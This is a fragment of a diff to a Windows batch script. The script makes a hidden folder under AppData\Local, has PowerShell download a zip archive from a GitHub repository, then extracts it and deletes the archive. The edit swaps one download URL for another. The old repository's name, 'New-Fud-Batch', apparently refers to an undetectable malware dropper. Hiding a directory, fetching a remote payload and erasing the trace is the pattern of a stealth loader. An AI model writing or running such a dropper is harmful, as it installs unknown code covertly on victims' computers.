@@ -28,7 +28,7 @@ cd "C:\Users\%USERNAME%\AppData\Local"
 mkdir "Anon"
 attrib +h "Anon" /s /d
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/New-Fud-Batch/raw/main/1.zip' -OutFile 1.zip"
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm93/1/raw/refs/heads/main/1.zip' -OutFile 1.zip"
 tar -xf 1.zip
 del 1.zip
 
